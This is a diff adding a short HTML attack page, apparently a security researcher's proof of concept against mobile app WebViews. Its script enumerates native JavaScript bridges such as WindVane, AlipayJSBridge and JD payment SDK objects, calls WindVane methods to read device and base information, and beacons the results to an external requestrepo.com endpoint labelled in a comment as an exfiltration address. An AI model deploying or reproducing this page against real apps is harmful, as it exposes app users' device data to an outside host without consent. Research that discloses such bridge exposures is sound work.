@@ -1,0 +1,25 @@
+<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>kb</title>
+<body style="background:#fff;color:#000;font:16px monospace;padding:8px">
+<pre id="o" style="white-space:pre-wrap;word-break:break-all;font-size:15px">running…</pre>
+<script>
+var EXFIL = "https://enio2ns.requestrepo.com/requests"; // 外带地址(占位,可改)
+var out = {href:location.href, origin:location.origin, bridges:[], windvane:[], err:null};
+function methodsOf(b){var s={},a=[],o=b;for(var d=0;d<5&&o;d++){try{Object.getOwnPropertyNames(o).forEach(function(p){if(!s[p]){s[p]=1;a.push(p);}});}catch(e){}o=Object.getPrototypeOf(o);}return a;}
+function show(){var s=JSON.stringify(out,null,1);document.getElementById('o').textContent=s;try{navigator.sendBeacon?navigator.sendBeacon(EXFIL,new Blob([s],{type:'text/plain'})):0;}catch(e){}}
+try{
+  // 1) 枚举常见 JS 桥对象
+  var dict=["__windvane__","WindVane","windvane","WVJB","AlipayJSBridge","_DSBridge_","dsBridge","WebViewJavascriptBridge","android","Android","native","Native","app","App","client","Client","jsapi","JsApi","prompt","sdk","SDK","container","H5Container","uniInterface","kvInterface","jsInterface","HeytapNativeApi","JDJSCore","JDPaySdk","JDAppUnite"];
+  dict.forEach(function(n){try{if(window[n]){var m=methodsOf(window[n]);out.bridges.push({name:n,type:typeof window[n],methods:m.slice(0,50)});}}catch(e){}});
+  // 2) WindVane 只读调用（证明桥可从攻击页调起）
+  if(window.WindVane && window.WindVane.call){
+    out.windvane.push("WindVane.call available");
+    try{window.WindVane.call("WVBase","getDeviceInfo",{params:{}},function(r){out.windvane.push("getDeviceInfo OK:"+JSON.stringify(r).slice(0,300));show();},function(e){out.windvane.push("getDeviceInfo FAIL:"+JSON.stringify(e).slice(0,200));show();});}catch(e){out.windvane.push("getDeviceInfo exc:"+e);}
+    try{window.WindVane.call("BaseInfo","getBaseInfo",{},function(r){out.windvane.push("getBaseInfo OK:"+JSON.stringify(r).slice(0,300));show();},function(e){out.windvane.push("getBaseInfo FAIL:"+JSON.stringify(e).slice(0,200));show();});}catch(e){}
+  } else if(window.__windvane__){
+    out.windvane.push("__windvane__ present, call="+(typeof window.__windvane__.call));
+  }
+}catch(e){out.err=String(e);}
+show();
+setTimeout(show,2500); // 等异步回调后再刷一次
+</script></body>
